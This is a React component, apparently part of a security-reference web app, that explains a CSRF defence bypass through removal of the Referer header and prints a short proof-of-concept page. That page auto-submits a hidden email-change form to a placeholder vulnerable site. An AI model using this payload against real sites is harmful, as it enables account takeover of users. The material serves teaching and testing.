import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const CSRF_Referer_Header_Removed = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Typography>
              Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The applications may validate the Referer header when it is present in requests but skip the validation if the header is omitted. 
              </Typography>
              <Box pt={5}></Box>
              <Typography>
              The following code will drop the referer header.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'<meta name="referrer" content="never">'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography>
              PoC
              </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'<html>\n'+
               '    <body>\n'+
               '        <meta name="referrer" content="never">\n'+
               '        <form action="https://vulnerable-website.com/email/change" method="POST">\n'+
               '            <input type="hidden" name="email" value="pwned@evil-user.net" />\n'+
               '            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />\n'+
               '        </form>\n'+
               '        <script>\n'+
               '            document.forms[0].submit();\n'+
               '        </script>\n'+
               '    </body>\n'+
               '</html>'}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Reports">
                
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default CSRF_Referer_Header_Removed;
  